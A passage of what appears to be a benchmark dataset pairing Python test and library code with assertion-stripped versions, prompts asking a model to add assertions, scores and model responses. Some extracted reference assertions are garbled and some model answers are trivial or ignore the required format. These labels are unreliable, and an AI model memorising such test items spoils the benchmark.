13        signal_event = SignalEvent('AAPL', SignalType.LONG,
14                                   target_price=101.22)
15
16    def test_trade_event(self):
17        trade_event = TradeEvent('one', 111.11, 2, '2017-03-18')
18
19    def test_fill_event(self):
20        fill_event = FillEvent('one', 112.11, 500, '2017-03-18')
21
22    def test_event_from_dict(self):
23
24        signal_event_dict = {
25            'ticker': 'AAPL',
26            'dt': '2017-03-18',
27            'signal_type': 'SHORT',
28            'limit_price': 124.11,
29            'upper_price': 160.11,
30            'action': 'SELL',
31            'junk': 'more junk'
32        }
33
34        signal_event = SignalEvent.from_dict(signal_event_dict)
35
36","[['market_event.event_type', '==', 'EventType.MARKET'], ['issubclass(market_event.__class__', '==', 'True'], ['signal_event.event_type', '==', 'EventType.SIGNAL'], ['signal_event.signal_type', '==', 'SignalType.LONG'], ['signal_event.ticker', '==', ""'AAPL'""], ['signal_event.target_price', '==', '101.22'], ['signal_event.order_type', '==', 'OrderType.MARKET'], ['issubclass(signal_event.__class__', '==', 'True'], ['trade_event.event_type', '==', 'EventType.TRADE'], ['trade_event.qty', '==', '2'], ['issubclass(trade_event.__class__', '==', 'True'], ['fill_event.event_type', '==', 'EventType.FILL'], ['fill_event.price', '==', '112.11'], ['fill_event.available_volume', '==', '500'], ['issubclass(fill_event.__class__', '==', 'True'], ['signal_event.ticker', '==', ""'AAPL'""], ['signal_event.signal_type', '==', 'SignalType.SHORT']]",19,17,0.8947368421052632,0.0083538083538083,"['market_event', 'signal_event', 'trade_event', 'fill_event', 'signal_event_dict']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['market_event', 'signal_event', 'trade_event', 'fill_event', 'signal_event_dict']
*Code:

1import pytest
2from pytech.backtest.event import (Event, MarketEvent, SignalEvent, TradeEvent,
3                                   FillEvent)
4from pytech.utils.enums import EventType, SignalType, OrderType
5
6
7class TestMarketEvent(object):
8
9    def test_market_event(self):
10        market_event = MarketEvent()
11
12    def test_signal_event(self):
13        signal_event = SignalEvent('AAPL', SignalType.LONG,
14                                   target_price=101.22)
15
16    def test_trade_event(self):
17        trade_event = TradeEvent('one', 111.11, 2, '2017-03-18')
18
19    def test_fill_event(self):
20        fill_event = FillEvent('one', 112.11, 500, '2017-03-18')
21
22    def test_event_from_dict(self):
23
24        signal_event_dict = {
25            'ticker': 'AAPL',
26            'dt': '2017-03-18',
27            'signal_type': 'SHORT',
28            'limit_price': 124.11,
29            'upper_price': 160.11,
30            'action': 'SELL',
31            'junk': 'more junk'
32        }
33
34        signal_event = SignalEvent.from_dict(signal_event_dict)
35
36",2553,"[[10, 'market_event', '!=', None, ""MarketEvent object should be instantiated""],
[14, 'signal_event', '!=', None, ""SignalEvent object should be instantiated""],
[17, 'trade_event', '!=', None, ""TradeEvent object should be instantiated""],
[20, 'fill_event', '!=', None, ""FillEvent object should be instantiated""],
[34, 'signal_event', '!=', None, ""SignalEvent object should be instantiated from a dictionary""]]"
pyQode/pyqode.core,"from pyqode.qt import QtGui
from pyqode.qt.QtTest import QTest
from pyqode.core import modes
from test.helpers import preserve_style, editor_open


def get_mode(editor):
    return editor.modes.get(modes.CaretLineHighlighterMode)


def test_enabled(editor):
    mode = get_mode(editor)
    assert mode.enabled
    mode.enabled = False
    mode.enabled = True


def test_properties(editor):
    mode = get_mode(editor)
    assert isinstance(mode.background, QtGui.QColor)
    c = QtGui.QColor('red')
    mode.background = c
    assert mode.background.name() == c.name()


def test_style(editor):
    mode = get_mode(editor)
    c = QtGui.QColor('yellow')
    mode.background = c
    QTest.qWait(1000)
    assert mode.background.name() == c.name()


@editor_open(__file__)
def test_deco(editor):
    assert len(editor.decorations) > 0
","
1from pyqode.qt import QtGui
2from pyqode.qt.QtTest import QTest
3from pyqode.core import modes
4from test.helpers import preserve_style, editor_open
5
6
7def get_mode(editor):
8    return editor.modes.get(modes.CaretLineHighlighterMode)
9
10
11def test_enabled(editor):
12    mode = get_mode(editor)
13    mode.enabled = False
14    mode.enabled = True
15
16
17def test_properties(editor):
18    mode = get_mode(editor)
19    c = QtGui.QColor('red')
20    mode.background = c
21
22
23def test_style(editor):
24    mode = get_mode(editor)
25    c = QtGui.QColor('yellow')
26    mode.background = c
27    QTest.qWait(1000)
28
29
30@editor_open(__file__)
31def test_deco(editor):
32","[['mode.enabled', '==', 'True'], ['mode.background.name()', '==', 'c.name()'], ['mode.background.name()', '==', 'c.name()'], ['len(editor.decorations)', '>', '0']]",5,4,0.8,0.0048019207683073,"['editor', 'mode', 'mode.enabled', 'c', 'mode.background']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['editor', 'mode', 'mode.enabled', 'c', 'mode.background']
*Code:

1from pyqode.qt import QtGui
2from pyqode.qt.QtTest import QTest
3from pyqode.core import modes
4from test.helpers import preserve_style, editor_open
5
6
7def get_mode(editor):
8    return editor.modes.get(modes.CaretLineHighlighterMode)
9
10
11def test_enabled(editor):
12    mode = get_mode(editor)
13    mode.enabled = False
14    mode.enabled = True
15
16
17def test_properties(editor):
18    mode = get_mode(editor)
19    c = QtGui.QColor('red')
20    mode.background = c
21
22
23def test_style(editor):
24    mode = get_mode(editor)
25    c = QtGui.QColor('yellow')
26    mode.background = c
27    QTest.qWait(1000)
28
29
30@editor_open(__file__)
31def test_deco(editor):
32",2119,"[[7, 'editor', '!=', None, ""the function 'get_mode' requires a valid 'editor' input""],
 [11, 'editor', '!=', None, ""the function 'test_enabled' requires a valid 'editor' input""],
 [13, 'mode.enabled', '==', False, 'to ensure that the mode.enabled is set to False before it can be set back to True'],
 [17, 'editor', '!=', None, ""the function 'test_properties' requires a valid 'editor' input""],
 [24, 'editor', '!=', None, ""the function 'test_style' requires a valid 'editor' input""],
 [31, 'editor', '!=', None, ""the decorator function 'test_deco' requires a valid 'editor' input""]]"
OlegHahm/RIOT,"#!/usr/bin/env python3

#  Copyright (C) 2021 Otto-von-Guericke-Universität Magdeburg
#
# This file is subject to the terms and conditions of the GNU Lesser
# General Public License v2.1. See the file LICENSE in the top level
# directory for more details.

# @author      Marian Buschsieweke <marian.buschsieweke@ovgu.de>

import sys
from testrunner import run

MIN_PRINTS = 5


def assertAlmostEqual(first, second, delta=0.05):
    assert first + delta > second
    assert first - delta < second


def same_computation_as_in_c_prog(thread_num):
    f = 1.0 * thread_num
    for _ in range(10000):
        f = f + 1.0 / f
    return f


def testfunc(child):
    child.expect_exact(""THREADS CREATED"")
    child.expect_exact(""THREAD t1 start"")
    child.expect_exact(""THREAD t2 start"")
    child.expect_exact(""THREAD t3 start"")

    child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
    first_thread = int(child.match.group(1))
    # Note: intentionally keeping the float output as string to also test that printf(""%f"", ...)
    # prints the exact same char sequence for the same float value each time
    first_result = child.match.group(2)

    # wait for second thread to print, but wait at most 50 messages
    second_thread = None
    for _ in range(50):
        child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
        if int(child.match.group(1)) != first_thread:
            second_thread = int(child.match.group(1))
            second_result = child.match.group(2)
            break

    assert second_thread is not None, ""both threads t1 and t3 should print""
    assert first_thread in [1, 3], ""only thread t1 and t3 should print""
    assert second_thread in [1, 3], ""only thread t1 and t3 should print""
    assertAlmostEqual(float(first_result), same_computation_as_in_c_prog(first_thread))
    assertAlmostEqual(float(second_result), same_computation_as_in_c_prog(second_thread))

    count_first_thread = 0
    count_second_thread = 0

    # wait for both threads to print at least MIN_PRINTS times, but wait at most 100 messages
    for _ in range(100):
        child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
        thread = int(child.match.group(1))
        assert thread in [1, 3], ""only thread t1 and t3 should print""
        result = child.match.group(2)

        if thread == first_thread:
            assert result == first_result, ""same calculation but different result""
            count_first_thread += 1
        else:
            assert result == second_result, ""same calculation but different result""
            count_second_thread += 1

        if (count_first_thread >= MIN_PRINTS) and (count_second_thread >= MIN_PRINTS):
            break

    msg = ""Either t1 or t3 printed less than {} times within 100 messages"".format(MIN_PRINTS)
    assert (count_first_thread >= MIN_PRINTS) and (count_second_thread >= MIN_PRINTS), msg


if __name__ == ""__main__"":
    sys.exit(run(testfunc))
","
1#!/usr/bin/env python3
2
3#  Copyright (C) 2021 Otto-von-Guericke-Universität Magdeburg
4#
5# This file is subject to the terms and conditions of the GNU Lesser
6# General Public License v2.1. See the file LICENSE in the top level
7# directory for more details.
8
9# @author      Marian Buschsieweke <marian.buschsieweke@ovgu.de>
10
11import sys
12from testrunner import run
13
14MIN_PRINTS = 5
15
16
17
18
19def same_computation_as_in_c_prog(thread_num):
20    f = 1.0 * thread_num
21    for _ in range(10000):
22        f = f + 1.0 / f
23    return f
24
25
26def testfunc(child):
27    child.expect_exact(""THREADS CREATED"")
28    child.expect_exact(""THREAD t1 start"")
29    child.expect_exact(""THREAD t2 start"")
30    child.expect_exact(""THREAD t3 start"")
31
32    child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
33    first_thread = int(child.match.group(1))
34    # Note: intentionally keeping the float output as string to also test that printf(""%f"", ...)
35    # prints the exact same char sequence for the same float value each time
36    first_result = child.match.group(2)
37
38    # wait for second thread to print, but wait at most 50 messages
39    second_thread = None
40    for _ in range(50):
41        child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
42        if int(child.match.group(1)) != first_thread:
43            second_thread = int(child.match.group(1))
44            second_result = child.match.group(2)
45            break
46
47
48    count_first_thread = 0
49    count_second_thread = 0
50
51    # wait for both threads to print at least MIN_PRINTS times, but wait at most 100 messages
52    for _ in range(100):
53        child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
54        thread = int(child.match.group(1))
55        result = child.match.group(2)
56
57        if thread == first_thread:
58            count_first_thread += 1
59        else:
60            count_second_thread += 1
61
62        if (count_first_thread >= MIN_PRINTS) and (count_second_thread >= MIN_PRINTS):
63            break
64
65    msg = ""Either t1 or t3 printed less than {} times within 100 messages"".format(MIN_PRINTS)
66
67
68if __name__ == ""__main__"":
69    sys.exit(run(testfunc))
70","[['first + delta', '>', 'second'], ['first - delta', '<', 'second'], ['second_thread', '==', 'not None'], ['t3', 'should', 'print""'], ['result', '==', 'first_result'], ['result', '==', 'second_result'], ['(count_first_thread', '>=', 'MIN_PRINTS)'], ['(count_second_thread', '>=', 'MIN_PRINTS)']]",12,8,0.6666666666666666,0.002770083102493,"['MIN_PRINTS', 'first', 'second', 'delta', 'thread_num', 'f', 'child', 'first_thread', 'first_result', 'second_thread', 'second_result', 'count_first_thread', 'count_second_thread', 'thread', 'result', 'msg']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['MIN_PRINTS', 'first', 'second', 'delta', 'thread_num', 'f', 'child', 'first_thread', 'first_result', 'second_thread', 'second_result', 'count_first_thread', 'count_second_thread', 'thread', 'result', 'msg']
*Code:

1#!/usr/bin/env python3
2
3#  Copyright (C) 2021 Otto-von-Guericke-Universität Magdeburg
4#
5# This file is subject to the terms and conditions of the GNU Lesser
6# General Public License v2.1. See the file LICENSE in the top level
7# directory for more details.
8
9# @author      Marian Buschsieweke <marian.buschsieweke@ovgu.de>
10
11import sys
12from testrunner import run
13
14MIN_PRINTS = 5
15
16
17
18
19def same_computation_as_in_c_prog(thread_num):
20    f = 1.0 * thread_num
21    for _ in range(10000):
22        f = f + 1.0 / f
23    return f
24
25
26def testfunc(child):
27    child.expect_exact(""THREADS CREATED"")
28    child.expect_exact(""THREAD t1 start"")
29    child.expect_exact(""THREAD t2 start"")
30    child.expect_exact(""THREAD t3 start"")
31
32    child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
33    first_thread = int(child.match.group(1))
34    # Note: intentionally keeping the float output as string to also test that printf(""%f"", ...)
35    # prints the exact same char sequence for the same float value each time
36    first_result = child.match.group(2)
37
38    # wait for second thread to print, but wait at most 50 messages
39    second_thread = None
40    for _ in range(50):
41        child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
42        if int(child.match.group(1)) != first_thread:
43            second_thread = int(child.match.group(1))
44            second_result = child.match.group(2)
45            break
46
47
48    count_first_thread = 0
49    count_second_thread = 0
50
51    # wait for both threads to print at least MIN_PRINTS times, but wait at most 100 messages
52    for _ in range(100):
53        child.expect(r""t(\d): (\d{3}\.\d+)\r\n"")
54        thread = int(child.match.group(1))
55        result = child.match.group(2)
56
57        if thread == first_thread:
58            count_first_thread += 1
59        else:
60            count_second_thread += 1
61
62        if (count_first_thread >= MIN_PRINTS) and (count_second_thread >= MIN_PRINTS):
63            break
64
65    msg = ""Either t1 or t3 printed less than {} times within 100 messages"".format(MIN_PRINTS)
66
67
68if __name__ == ""__main__"":
69    sys.exit(run(testfunc))
70",3763,"Here are the assertions:

[14, 'MIN_PRINTS', >=, 1, 'minimum prints should be a positive integer']
[20, 'thread_num', >=, 1, 'thread number should be a positive integer']
[32, 'first_thread', >=, 1, 'first thread number should be a positive integer']
[36, 'first_result', !=, '', 'first result should not be empty']
[43, 'second_thread', >=, 1, 'second thread number should be a positive integer']
[44, 'second_result', !=, '', 'second result should not be empty']
[48, 'count_first_thread', >=, 0, 'count of first thread prints should be a non-negative integer']
[49, 'count_second_thread', >=, 0, 'count of second thread prints should be a non-negative integer']
[54, 'thread', >=, 1, 'thread number should be a positive integer']
[55, 'result', !=, '', 'result should not be empty']
[65, 'msg', !=, '', 'message should not be empty']"
Dfred/concept-robot,"# PyVision License
#
# Copyright (c) 2006-2008 David S. Bolme
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 
# 1. Redistributions of source code must retain the above copyright
# notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright
# notice, this list of conditions and the following disclaimer in the
# documentation and/or other materials provided with the distribution.
# 
# 3. Neither name of copyright holders nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
# 
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
# A PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
# LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
# NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import Point as pt

try:
    import opencv as cv
except:
    import cv
def BoundingRect(*points):
    '''
    Create a rectangle that includes all of the points.
    '''
    tmp = []
    for each in points:
        if type(each) == list or type(each) == tuple:
            tmp += each
        else:
            tmp.append(each)
    assert len(tmp) > 0
    minx = maxx = tmp[0].X()
    miny = maxy = tmp[0].Y()
    for each in tmp:
        minx = min(minx,each.X())
        maxx = max(maxx,each.X())
        miny = min(miny,each.Y())
        maxy = max(maxy,each.Y())
    return Rect(minx,miny,maxx-minx,maxy-miny)


class Rect:
    '''
    This is a simple structure that represents a rectangle.
    '''
    
    def __init__(self,x=0.0,y=0.0,w=0.0,h=0.0):
        ''' 
        Initialize a rectangle instance.
        
        Arguments:
        @param x: top left x coordinate
        @param y: top left y coordinate
        @param w: width
        @param h: height
        '''
        self.x = float(x)
        self.y = float(y)
        self.w = float(w)
        self.h = float(h)
        
    def intersect(self, rect):
        '''
        Compute the intersection of two rectangles.
        
        @returns: a rectangle representing the intersection.
        '''
        r1 = self
        r2 = rect
        
        r1_x1 = r1.x
        r1_x2 = r1.x + r1.w
        r1_y1 = r1.y
        r1_y2 = r1.y + r1.h

        r2_x1 = r2.x
        r2_x2 = r2.x + r2.w
        r2_y1 = r2.y
        r2_y2 = r2.y + r2.h
        
        #print r1_x1,r1_x2,r1_y1,r1_y2
        #print r2_x1,r2_x2,r2_y1,r2_y2
        
        r3_x1 = max(r1_x1,r2_x1)
        r3_x2 = min(r1_x2,r2_x2)
        r3_y1 = max(r1_y1,r2_y1)
        r3_y2 = min(r1_y2,r2_y2)

        #print r3_x1,r3_x2,r3_y1,r3_y2
        
        r3_w = r3_x2-r3_x1
        r3_h = r3_y2-r3_y1
        
        if r3_w < 0.0 or r3_h < 0.0:
            return None
        
        return Rect(r3_x1,r3_y1,r3_w, r3_h)
    
    def containsPoint(self,point):
        '''
        Determine if a point is within a rectangle.
        
        @param point: an object of type pv.Point.
        @returns: True if the point is withen the Rect.
        '''
        x = point.X()
        y = point.Y()
        
        return x >= self.x and x <= self.x+self.w and y >= self.y and y <= self.y + self.h
        
    def center(self):
        '''
        Compute and return a point at the center of the rectangle
        
        @returns: a pv.Point at the center.
        '''
        return pt.Point(self.x+0.5*self.w,self.y+0.5*self.h)
    
    def area(self):
        '''
        @returns: the area of the rect
        '''
        return self.w*self.h
    
    def __str__(self):
        '''
        @returns: a string representing this rectangle
        '''
        return ""Rect(%f,%f,%f,%f)""%(self.x,self.y,self.w,self.h)
    
    def box(self):
        '''
        Get this rectangle as a bounding box as expected by many PIL functions.
        
        @returns: tuple of (left,top,right,bottom)
        '''
        return int(round(self.x)), int(round(self.y)), int(round(self.x+self.w)), int(round(self.y+self.h))

    def asOpenCV(self):
        '''
        Returns a representation compatible with opencv.
        '''
        return (int(round(self.x)),int(round(self.y)),int(round(self.w)),int(round(self.h)))

    def __mul__(self,val):
        '''
        Multiply the rectangle by a constant.
        '''
        if isinstance(val,float) or isinstance(val,int): 
            return Rect(self.x*val,self.y*val,self.w*val,self.h*val)

    def __rmul__(self,val):
        '''
        Multiply the rectangle by a constant.
        '''
        if isinstance(val,float) or isinstance(val,int): 
            return Rect(self.x*val,self.y*val,self.w*val,self.h*val)


def test():
    '''
    '''
    import Point
    p1 = Point.Point(1,1)
    p2 = Point.Point(4,4)
    p3 = Point.Point(5,4)
    p4 = Point.Point(6,8)

    r1 = BoundingRect(p1,p2)
    r2 = BoundingRect(p3,p4)
    r3 = Rect(3,3,3,3)
    print r1
    print r2
    print r1.intersect(r2)
    print r3.intersect(r2)
    
if __name__ == ""__main__"":
    test()


","
1# PyVision License
2#
3# Copyright (c) 2006-2008 David S. Bolme
4# All rights reserved.
5#
6# Redistribution and use in source and binary forms, with or without
7# modification, are permitted provided that the following conditions
8# are met:
9# 
10# 1. Redistributions of source code must retain the above copyright
11# notice, this list of conditions and the following disclaimer.
12# 
13# 2. Redistributions in binary form must reproduce the above copyright
14# notice, this list of conditions and the following disclaimer in the
15# documentation and/or other materials provided with the distribution.
16# 
17# 3. Neither name of copyright holders nor the names of its contributors
18# may be used to endorse or promote products derived from this software
19# without specific prior written permission.
20# 
21# 
22# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
23# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
24# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
25# A PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR
26# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
27# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
28# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
29# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
30# LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
31# NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
32# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
33
34import Point as pt
35
36try:
37    import opencv as cv
38except:
39    import cv
40def BoundingRect(*points):
41    '''
42    Create a rectangle that includes all of the points.
43    '''
44    tmp = []
45    for each in points:
46        if type(each) == list or type(each) == tuple:
47            tmp += each
48        else:
49            tmp.append(each)
50    minx = maxx = tmp[0].X()
51    miny = maxy = tmp[0].Y()
52    for each in tmp:
53        minx = min(minx,each.X())
54        maxx = max(maxx,each.X())
55        miny = min(miny,each.Y())
56        maxy = max(maxy,each.Y())
57    return Rect(minx,miny,maxx-minx,maxy-miny)
58
59
60class Rect:
61    '''
62    This is a simple structure that represents a rectangle.
63    '''
64    
65    def __init__(self,x=0.0,y=0.0,w=0.0,h=0.0):
66        ''' 
67        Initialize a rectangle instance.
68        
69        Arguments:
70        @param x: top left x coordinate
71        @param y: top left y coordinate
72        @param w: width
73        @param h: height
74        '''
75        self.x = float(x)
76        self.y = float(y)
77        self.w = float(w)
78        self.h = float(h)
79        
80    def intersect(self, rect):
81        '''
82        Compute the intersection of two rectangles.
83        
84        @returns: a rectangle representing the intersection.
85        '''
86        r1 = self
87        r2 = rect
88        
89        r1_x1 = r1.x
90        r1_x2 = r1.x + r1.w
91        r1_y1 = r1.y
92        r1_y2 = r1.y + r1.h
93
94        r2_x1 = r2.x
95        r2_x2 = r2.x + r2.w
96        r2_y1 = r2.y
97        r2_y2 = r2.y + r2.h
98        
99        #print r1_x1,r1_x2,r1_y1,r1_y2
100        #print r2_x1,r2_x2,r2_y1,r2_y2
101        
102        r3_x1 = max(r1_x1,r2_x1)
103        r3_x2 = min(r1_x2,r2_x2)
104        r3_y1 = max(r1_y1,r2_y1)
105        r3_y2 = min(r1_y2,r2_y2)
106
107        #print r3_x1,r3_x2,r3_y1,r3_y2
108        
109        r3_w = r3_x2-r3_x1
110        r3_h = r3_y2-r3_y1
111        
112        if r3_w < 0.0 or r3_h < 0.0:
113            return None
114        
115        return Rect(r3_x1,r3_y1,r3_w, r3_h)
116    
117    def containsPoint(self,point):
118        '''
119        Determine if a point is within a rectangle.
120        
121        @param point: an object of type pv.Point.
122        @returns: True if the point is withen the Rect.
123        '''
124        x = point.X()
125        y = point.Y()
126        
127        return x >= self.x and x <= self.x+self.w and y >= self.y and y <= self.y + self.h
128        
129    def center(self):
130        '''
131        Compute and return a point at the center of the rectangle
132        
133        @returns: a pv.Point at the center.
134        '''
135        return pt.Point(self.x+0.5*self.w,self.y+0.5*self.h)
136    
137    def area(self):
138        '''
139        @returns: the area of the rect
140        '''
141        return self.w*self.h
142    
143    def __str__(self):
144        '''
145        @returns: a string representing this rectangle
146        '''
147        return ""Rect(%f,%f,%f,%f)""%(self.x,self.y,self.w,self.h)
148    
149    def box(self):
150        '''
151        Get this rectangle as a bounding box as expected by many PIL functions.
152        
153        @returns: tuple of (left,top,right,bottom)
154        '''
155        return int(round(self.x)), int(round(self.y)), int(round(self.x+self.w)), int(round(self.y+self.h))
156
157    def asOpenCV(self):
158        '''
159        Returns a representation compatible with opencv.
160        '''
161        return (int(round(self.x)),int(round(self.y)),int(round(self.w)),int(round(self.h)))
162
163    def __mul__(self,val):
164        '''
165        Multiply the rectangle by a constant.
166        '''
167        if isinstance(val,float) or isinstance(val,int): 
168            return Rect(self.x*val,self.y*val,self.w*val,self.h*val)
169
170    def __rmul__(self,val):
171        '''
172        Multiply the rectangle by a constant.
173        '''
174        if isinstance(val,float) or isinstance(val,int): 
175            return Rect(self.x*val,self.y*val,self.w*val,self.h*val)
176
177
178def test():
179    '''
180    '''
181    import Point
182    p1 = Point.Point(1,1)
183    p2 = Point.Point(4,4)
184    p3 = Point.Point(5,4)
185    p4 = Point.Point(6,8)
186
187    r1 = BoundingRect(p1,p2)
188    r2 = BoundingRect(p3,p4)
189    r3 = Rect(3,3,3,3)
190    print r1
191    print r2
192    print r1.intersect(r2)
193    print r3.intersect(r2)
194    
195if __name__ == ""__main__"":
196    test()
197
198
199","[['len(tmp)', '>', '0']]",1,1,1.0,0.000174611489436,"['*points', 'tmp', 'minx', 'miny', 'maxx', 'maxy', 'x', 'y', 'w', 'h', 'self.x', 'self.y', 'self.w', 'self.h', 'rect', 'r1', 'r2', 'r1_x1', 'r1_x2', 'r1_y1', 'r1_y2', 'r2_x1', 'r2_x2', 'r2_y1', 'r2_y2', 'r3_x1', 'r3_x2', 'r3_y1', 'r3_y2', 'r3_w', 'r3_h', 'point', 'val', 'p1', 'p2', 'p3', 'p4', 'r3']",38,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['*points', 'tmp', 'minx', 'miny', 'maxx', 'maxy', 'x', 'y', 'w', 'h', 'self.x', 'self.y', 'self.w', 'self.h', 'rect', 'r1', 'r2', 'r1_x1', 'r1_x2', 'r1_y1', 'r1_y2', 'r2_x1', 'r2_x2', 'r2_y1', 'r2_y2', 'r3_x1', 'r3_x2', 'r3_y1', 'r3_y2', 'r3_w', 'r3_h', 'point', 'val', 'p1', 'p2', 'p3', 'p4', 'r3']
*Code:

1# PyVision License
2#
3# Copyright (c) 2006-2008 David S. Bolme
4# All rights reserved.
5#
6# Redistribution and use in source and binary forms, with or without
7# modification, are permitted provided that the following conditions
8# are met:
9# 
10# 1. Redistributions of source code must retain the above copyright
11# notice, this list of conditions and the following disclaimer.
12# 
13# 2. Redistributions in binary form must reproduce the above copyright
14# notice, this list of conditions and the following disclaimer in the
15# documentation and/or other materials provided with the distribution.
16# 
17# 3. Neither name of copyright holders nor the names of its contributors
18# may be used to endorse or promote products derived from this software
19# without specific prior written permission.
20# 
21# 
22# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
23# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
24# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
